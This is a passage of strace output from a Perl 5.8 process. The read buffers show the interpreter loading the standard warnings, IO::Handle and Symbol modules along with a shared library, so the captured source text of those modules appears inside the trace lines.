\'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x54\\x05\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x40", 4096) = 4096
10195 07:31:50.921950 brk(0x81b6000)    = 0x81b6000
10195 07:31:50.922005 brk(0x81b5000)    = 0x81b5000
10195 07:31:50.922083 read(8, "\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x55\\x55\\x15\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\", # [46]\n  );\n\nour %DeadBits = (\n    \'all\'\t\t=> \"\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\x2a\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\xa8\\xaa\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\xa8\\x0a\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xaa\\xaa\\x2a\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\", 4096) = 4096
10195 07:31:50.922584 read(8, "x00\\x20\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\", # [46]\n  );\n\n$NONE     = \"\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\";\n$LAST_BIT = 94 ;\n$BYTES    = 12 ;\n\n$All = \"\" ; vec($All, $Offsets{\'all\'}, 2) = 3 ;\n\nsub Croaker\n{\n    local $Carp::CarpInternal{\'warnings\'};\n    delete $Carp::CarpInternal{\'warnings\'};\n    Carp::croak(@_);\n}\n\nsub bits\n{\n    # called from B::Deparse.pm\n\n    push @_, \'all\' unless @_;\n\n    my $mask;\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    return $mask ;\n}\n\nsub import \n{\n    shift;\n\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n    \n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nsub unimport \n{\n    shift;\n\n    my $catmask ;\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n\n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    next; \n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask &= ~($catmask | $DeadBits{$word} | $All);\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nmy %builtin_type; @builtin_type{qw(SCALAR ARRAY HASH CODE REF GLOB LVALUE Regexp)} = ();\n\nsub __chk\n{\n    my $category ;\n    my $offset ;\n    my $isobj = 0 ;\n\n    if (@_) {\n        # check the category supplied.\n        $category = shift ;\n        if (my $type = ref $category) {\n            Croaker(\"not an object\")\n                if exists $builtin_type{$type};\n\t    $category = $type;\n            $isobj = 1 ;\n        }\n        $offset = $Offsets{$category};\n        Croaker(\"Unknown warnings category \'$category\'\")\n\t    unless defined $offset;\n    }\n    else {\n        $category = (caller(1))[0] ;\n        $offset = $Offsets{$category};\n        Croaker(\"package \'$category\' not registered for warnings\")\n\t    unless defined $offset ;\n    }\n\n    my $this_pkg = (caller(1))[0] ;\n    my $i = 2 ;\n    my $pkg ;\n\n    if ($isobj) {\n        while (do { { package DB; $pkg = (caller($i++))[0] } } ) {\n            last unless @DB::args && $DB::args[0] =~ /^$category=/ ;\n        }\n\t$i -= 2 ;\n    }\n    else {\n        for ($i = 2 ; $pkg = (caller($i))[0] ; ++ $i) {\n            last if $pkg ne $this_pkg ;\n        }\n        $i = 2\n            if !$pkg || $pkg eq $this_pkg ;\n    }\n\n    my $callers_bitmask = (caller($i))[9] ;\n    return ($callers_bitmask, $offset, $i) ;\n}\n\nsub enabled\n{\n    Croaker(\"Usage: warnings::enabled([category])\")\n\tunless @_ == 1 || @_ == 0 ;\n\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return 0 unless defined $callers_bitmask ;\n    return vec($callers_bitmask, $offset, 1) ||\n           vec($callers_bitmask, $Offsets{\'all\'}, 1) ;\n}\n\nsub warn\n{\n    Croaker(\"Usage: warnings::warn([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $me", 4096) = 4096
10195 07:31:50.923276 read(8, "ssage = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n    Carp::carp($message) ;\n}\n\nsub warnif\n{\n    Croaker(\"Usage: warnings::warnif([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $message = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return\n        unless defined $callers_bitmask &&\n            \t(vec($callers_bitmask, $offset, 1) ||\n            \tvec($callers_bitmask, $Offsets{\'all\'}, 1)) ;\n\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n\n    Carp::carp($message) ;\n}\n\n1;\n# ex: set ro:\n", 4096) = 730
10195 07:31:50.923463 read(8, "", 4096) = 0
10195 07:31:50.923478 close(8)          = 0
10195 07:31:50.923628 _llseek(6, 412, [412], SEEK_SET) = 0
10195 07:31:50.923644 _llseek(6, 0, [412], SEEK_CUR) = 0
10195 07:31:50.923654 close(6)          = 0
10195 07:31:50.923695 stat64("/usr/lib/perl/5.8/auto/IO/IO.so", {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
10195 07:31:50.923718 stat64("/usr/lib/perl/5.8/auto/IO/IO.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
10195 07:31:50.923746 futex(0xb7f1f070, 0x81 /* FUTEX_??? */, 2147483647) = 0
10195 07:31:50.923761 open("/usr/lib/perl/5.8/auto/IO/IO.so", O_RDONLY) = 6
10195 07:31:50.923775 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\22\0\0004\0\0\0\0349\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\2006\0\0\2006\0\0\5\0\0\0\0\20\0\0\1\0\0\0\2006\0\0\200F\0\0\200F\0\0\360\1\0\0\364\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\2246\0\0\224F\0\0\224F\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0C\0\0\0E\0\0\0\0\0\0\0\t\0\0\0\3\0\0\0D\0\0\0\"\0\0\0009\0\0\0\0\0\0\0#\0\0\0\0\0\0\0%\0\0\0:\0\0\0\4\0\0\0001\0\0\0\37\0\0\0;\0\0\0\30\0\0\0+\0\0\0\23\0\0\0\n\0\0\0000\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\16\0\0\0\0\0\0\0004\0\0\0\0\0\0\0\0\0\0\0008\0\0\0\32\0\0\0\0\0\0\0\0\0\0\0?\0\0\0)\0\0\0\10\0\0\0.\0\0\0\26\0\0\0!\0\0\0\21\0\0\0(\0\0\0&\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0\0\0\0\0\0\0\0\0$\0\0\0006\0\0\0\24\0\0\0A\0\0\0\0\0\0\0\27\0\0\0@\0\0\0\0\0\0\0\5\0\0\0\0\0\0\0\0\0\0\0\33\0\0\0\17\0\0\0002\0\0\0\22\0\0\0>\0\0\0\'\0\0\0\36\0\0\0*\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\7\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
10195 07:31:50.923924 fstat64(6, {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
10195 07:31:50.923953 mmap2(NULL, 18548, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7f23000
10195 07:31:50.923966 mmap2(0xb7f27000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x3) = 0xb7f27000
10195 07:31:50.923983 close(6)          = 0
10195 07:31:50.924110 stat64("/etc/perl/IO/Handle.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.924127 stat64("/etc/perl/IO/Handle.pm", 0xbfc570bc) = -1 ENOENT (No such file or directory)
10195 07:31:50.924141 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.924153 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pm", 0xbfc570bc) = -1 ENOENT (No such file or directory)
10195 07:31:50.924167 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.924180 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pm", 0xbfc570bc) = -1 ENOENT (No such file or directory)
10195 07:31:50.924194 stat64("/usr/lib/perl5/IO/Handle.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.924206 stat64("/usr/lib/perl5/IO/Handle.pm", 0xbfc570bc) = -1 ENOENT (No such file or directory)
10195 07:31:50.924219 stat64("/usr/share/perl5/IO/Handle.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.924231 stat64("/usr/share/perl5/IO/Handle.pm", 0xbfc570bc) = -1 ENOENT (No such file or directory)
10195 07:31:50.924244 stat64("/usr/lib/perl/5.8/IO/Handle.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.924256 stat64("/usr/lib/perl/5.8/IO/Handle.pm", {st_mode=S_IFREG|0644, st_size=7592, ...}) = 0
10195 07:31:50.924277 open("/usr/lib/perl/5.8/IO/Handle.pm", O_RDONLY|O_LARGEFILE) = 6
10195 07:31:50.924291 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc56ec8) = -1 ENOTTY (Inappropriate ioctl for device)
10195 07:31:50.924317 _llseek(6, 0, [0], SEEK_CUR) = 0
10195 07:31:50.924365 read(6, "package IO::Handle;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO ();\t# Load the XS module\n\nrequire Exporter;\n@ISA = qw(Exporter);\n\n$VERSION = \"1.25\";\n$VERSION = eval $VERSION;\n\n@EXPORT_OK = qw(\n    autoflush\n    output_field_separator\n    output_record_separator\n    input_record_separator\n    input_line_number\n    format_page_number\n    format_lines_per_page\n    format_lines_left\n    format_name\n    format_top_name\n    format_line_break_characters\n    format_formfeed\n    format_write\n\n    print\n    printf\n    getline\n    getlines\n\n    printflush\n    flush\n\n    SEEK_SET\n    SEEK_CUR\n    SEEK_END\n    _IOFBF\n    _IOLBF\n    _IONBF\n);\n\n################################################\n## Constructors, destructors.\n##\n\nsub new {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 1 or croak \"usage: new $class\";\n    my $io = gensym;\n    bless $io, $class;\n}\n\nsub new_from_fd {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 3 or croak \"usage: new_from_fd $class FD, MODE\";\n    my $io = gensym;\n    shift;\n    IO::Handle::fdopen($io, @_)\n\tor return undef;\n    bless $io, $class;\n}\n\n#\n# There is no need for DESTROY to do anything, because when the\n# last reference to an IO object is gone, Perl automatically\n# closes its associated files (if any).  However, to avoid any\n# attempts to autoload DESTROY, we here define it to do nothing.\n#\nsub DESTROY {}\n\n################################################\n## Open and close.\n##\n\nsub _open_mode_string {\n    my ($mode) = @_;\n    $mode =~ /^\\+?(<|>>?)$/\n      or $mode =~ s/^r(\\+?)$/$1</\n      or $mode =~ s/^w(\\+?)$/$1>/\n      or $mode =~ s/^a(\\+?)$/$1>>/\n      or croak \"IO::Handle: bad open mode: $mode\";\n    $mode;\n}\n\nsub fdopen {\n    @_ == 3 or croak \'usage: $io->fdopen(FD, MODE)\';\n    my ($io, $fd, $mode) = @_;\n    local(*GLOB);\n\n    if (ref($fd) && \"\".$fd =~ /GLOB\\(/o) {\n\t# It\'s a glob reference; Alias it as we cannot get name of anon GLOBs\n\tmy $n = qualify(*GLOB);\n\t*GLOB = *{*$fd};\n\t$fd =  $n;\n    } elsif ($fd =~ m#^\\d+$#) {\n\t# It\'s an FD number; prefix with \"=\".\n\t$fd = \"=$fd\";\n    }\n\n    open($io, _open_mode_string($mode) . \'&\' . $fd)\n\t? $io : undef;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $io->close()\';\n    my($io) = @_;\n\n    close($io);\n}\n\n################################################\n## Normal I/O functions.\n##\n\n# flock\n# select\n\nsub opened {\n    @_ == 1 or croak \'usage: $io->opened()\';\n    defined fileno($_[0]);\n}\n\nsub fileno {\n    @_ == 1 or croak \'usage: $io->fileno()\';\n    fileno($_[0]);\n}\n\nsub getc {\n    @_ == 1 or croak \'usage: $io->getc()\';\n    getc($_[0]);\n}\n\nsub eof {\n    @_ == 1 or croak \'usage: $io->eof()\';\n    eof($_[0]);\n}\n\nsub print {\n    @_ or croak \'usage: $io->print(ARGS)\';\n    my $this = shift;\n    print $this @_;\n}\n\nsub printf {\n    @_ >= 2 or croak \'usage: $io->printf(FMT,[ARGS])\';\n    my $this = shift;\n    printf $this @_;\n}\n\nsub getline {\n    @_ == 1 or croak \'usage: $io->getline()\';\n    my $this = shift;\n    return scalar <$this>;\n} \n\n*gets = \\&getline;  # deprecated\n\nsub getlines {\n    @_ == 1 or croak \'usage: $io->getlines()\';\n    wantarray or\n\tcroak \'Can\\\'t call $io->getlines in a scalar context, use $io->getline\';\n    my $this = shift;\n    return <$this>;\n}\n\nsub truncate {\n    @_ == 2 or croak \'usage: $io->truncate(LEN)\';\n    truncate($_[0], $_[1]);\n}\n\nsub read {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->read(BUF, LEN [, OFFSET])\';\n    read($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub sysread {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->sysread(BUF, LEN [, OFFSET])\';\n    sysread($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub write {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->write(BUF [, LEN [, OFFSET]])\';\n    local($\\) = \"\";\n    $_[2] = length($_[1]) unless defined $_[2];\n    print { $_[0] } substr($_[1], $_[3] || 0, $_[2]);\n}\n\nsub syswrite {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->syswrite(BUF [, LEN [, OFFSET]])\';\n    if (defined($_[2])) {\n\tsyswrite($_[0], $_[1], $_[2], $_[3] || 0);\n    } else {\n\tsyswrite($_[0], $_[1]);\n    }\n}\n\nsub stat {\n    @_ == 1 or croak \'u", 4096) = 4096
10195 07:31:50.924740 stat64("/etc/perl/Symbol.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.924756 stat64("/etc/perl/Symbol.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.924770 stat64("/usr/local/lib/perl/5.8.8/Symbol.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.924782 stat64("/usr/local/lib/perl/5.8.8/Symbol.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.924809 stat64("/usr/local/share/perl/5.8.8/Symbol.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.924850 stat64("/usr/local/share/perl/5.8.8/Symbol.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.924879 stat64("/usr/lib/perl5/Symbol.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.924891 stat64("/usr/lib/perl5/Symbol.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.924905 stat64("/usr/share/perl5/Symbol.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.924917 stat64("/usr/share/perl5/Symbol.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.924934 stat64("/usr/lib/perl/5.8/Symbol.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.924960 stat64("/usr/lib/perl/5.8/Symbol.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.924973 stat64("/usr/share/perl/5.8/Symbol.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.924985 stat64("/usr/share/perl/5.8/Symbol.pm", {st_mode=S_IFREG|0644, st_size=2099, ...}) = 0
10195 07:31:50.925006 open("/usr/share/perl/5.8/Symbol.pm", O_RDONLY|O_LARGEFILE) = 8
10195 07:31:50.925020 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc56a18) = -1 ENOTTY (Inappropriate ioctl for device)
10195 07:31:50.925032 _llseek(8, 0, [0], SEEK_CUR) = 0
10195 07:31:50.925049 read(8, "package Symbol;\n\nBEGIN { require 5.005; }\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(gensym ungensym qualify qualify_to_ref);\n@EXPORT_OK = qw(delete_package geniosym);\n\n$VERSION = \'1.06\';\n\nmy $genpkg = \"Symbol::\";\nmy $genseq = 0;\n\nmy %global = map {$_ => 1} qw(ARGV ARGVOUT ENV INC SIG STDERR STDIN STDOUT);\n\n#\n# Note that we never _copy_ the glob; we just make a ref to it.\n# If we did copy it, then SVf_FAKE would be set on the copy, and\n# glob-specific behaviors (e.g. C<*$ref = \\&func>) wouldn\'t work.\n#\nsub gensym () {\n    my $name = \"GEN\" . $genseq++;\n    my $ref = \\*{$genpkg . $name};\n    delete $$genpkg{$name};\n    $ref;\n}\n\nsub geniosym () {\n    my $sym = gensym();\n    # force the IO slot to be filled\n    select(select $sym);\n    *$sym{IO};\n}\n\nsub ungensym ($) {}\n\nsub qualify ($;$) {\n    my ($name) = @_;\n    if (!ref($name) && index($name, \'::\') == -1 && index($name, \"\'\") == -1) {\n\tmy $pkg;\n\t# Global names: special character, \"^xyz\", or other. \n\tif ($name =~ /^(([^a-z])|(\\^[a-z_]+))\\z/i || $global{$name}) {\n\t    # RGS 2001-11-05 : translate leading ^X to control-char\n\t    $name =~ s/^\\^([a-z_])/\'qq(\\c\'.$1.\')\'/eei;\n\t    $pkg = \"main\";\n\t}\n\telse {\n\t    $pkg = (@_ > 1) ? $_[1] : caller;\n\t}\n\t$name = $pkg . \"::\" . $name;\n    }\n    $name;\n}\n\nsub qualify_to_ref ($;$) {\n    return \\*{ qualify $_[0], @_ > 1 ? $_[1] : caller };\n}\n\n#\n# of Safe.pm lineage\n#\nsub delete_package ($) {\n    my $pkg = shift;\n\n    # expand to full symbol table name if needed\n\n    unless ($pkg =~ /^main::.*::$/) {\n        $pkg = \"main$pkg\"\tif\t$pkg =~ /^::/;\n        $pkg = \"main::$pkg\"\tunless\t$pkg =~ /^main::/;\n        $pkg .= \'::\'\t\tunless\t$pkg =~ /::$/;\n    }\n\n    my($stem, $leaf) = $pkg =~ m/(.*::)(\\w+::)$/;\n    my $stem_symtab = *{$stem}{HASH};\n    return unless defined 